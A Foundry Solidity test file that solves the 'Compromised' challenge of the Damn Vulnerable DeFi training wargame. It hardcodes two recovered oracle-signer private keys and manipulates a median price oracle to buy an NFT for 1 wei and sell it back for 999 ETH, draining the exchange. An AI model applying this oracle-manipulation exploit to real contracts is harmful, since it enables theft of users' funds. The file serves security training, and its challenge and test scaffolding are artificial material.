// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

// IERC721Receiver: required by any contract that wants to receive ERC721 NFTs via safeTransferFrom.
// Without this interface, the NFT transfer will revert.
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery"); // final destination for drained ETH

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether; // total ETH we need to drain
    uint256 constant INITIAL_NFT_PRICE = 999 ether;            // starting NFT price
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;   // player starts with very little
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    // 3 trusted oracle sources — their median price determines the NFT price.
    // We recover private keys for sources[0] and sources[1] from the leaked server response,
    // giving us control over 2/3 sources and therefore the median.
    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    // Runs _isSolved() after every test_ function to verify win conditions
    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Fund the trusted oracle source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with only 0.1 ETH — not enough to buy NFT at 999 ETH normally
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy oracle via initializer, setting all 3 sources' prices to 999 ether
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy exchange with 999 ETH locked inside — this is what we drain
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * ATTACK SUMMARY:
     * ---------------
     * The leaked HTTP server response contains two hex-encoded, base64-encoded private keys.
     * Decoding each blob: hex → ASCII string → base64 decode → private key
     *
     * With 2 of 3 oracle sources under our control, we manipulate the median:
     *   - Oracle sorts all 3 prices and returns the middle value (index 1 of 3).
     *   - Set our 2 sources to 0   → sorted [0, 0, 999e18]   → median = 0
     *   - Set our 2 sources to 999 → sorted [999e18, 999e18, 999e18] → median = 999e18
     *
     * Steps:
     *   1. Crash price to 0  → buy NFT for 1 wei (minimum Exchange accepts)
     *   2. Inflate price to 999 ether → sell NFT back, draining the exchange
     *   3. Send 999 ETH to recovery address
     *   4. Restore price to 999 ether so the final oracle check in _isSolved() passes
     */
    function test_compromised() public checkSolved {
        // Private keys recovered by decoding the leaked server response blobs:
        //   privateKey1 → derives to sources[0] = 0x188Ea627...
        //   privateKey2 → derives to sources[1] = 0xA417D473...
        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

        // ---- STEP 1: Crash the price to 0 ----
        // Two sources post 0 → sorted prices become [0, 0, 999e18] → median = index 1 = 0
        vm.startPrank(vm.addr(privateKey1));
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        vm.startPrank(vm.addr(privateKey2));
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        // ---- STEP 2: Buy NFT for almost nothing ----
        // Exchange.buyOne requires msg.value == currentPrice (0).
        // But Exchange also rejects msg.value == 0, so we send 1 wei as the minimum.
        vm.startPrank(player);
        uint256 nftId = exchange.buyOne{value: 1}();
        vm.stopPrank();

        // ---- STEP 3: Inflate the price to 999 ether ----
        // Both sources post 999 ether → sorted [999e18, 999e18, 999e18] → median = 999 ether
        // Exchange will now pay us 999 ether when we sell the NFT back
        vm.startPrank(vm.addr(privateKey1));
        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();

        vm.startPrank(vm.addr(privateKey2));
        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();

        // ---- STEP 4: Sell NFT back to the exchange for 999 ETH ----
        // Must approve exchange to transfer our NFT before calling sellOne.
        // Exchange pays us the current median price (999 ether), fully draining itself.
        vm.startPrank(player);
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);

        // ---- STEP 5: Forward all ETH to the recovery address ----
        // Player now holds 999 ETH from the sale. Send it all to recovery.
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();

        // ---- STEP 6: Restore the oracle price ----
        // _isSolved() asserts oracle.getMedianPrice("DVNFT") == 999 ether.
        // Restore both compromised sources back to 999 ether so the median is correct.
        vm.startPrank(vm.addr(privateKey1));
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(vm.addr(privateKey2));
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
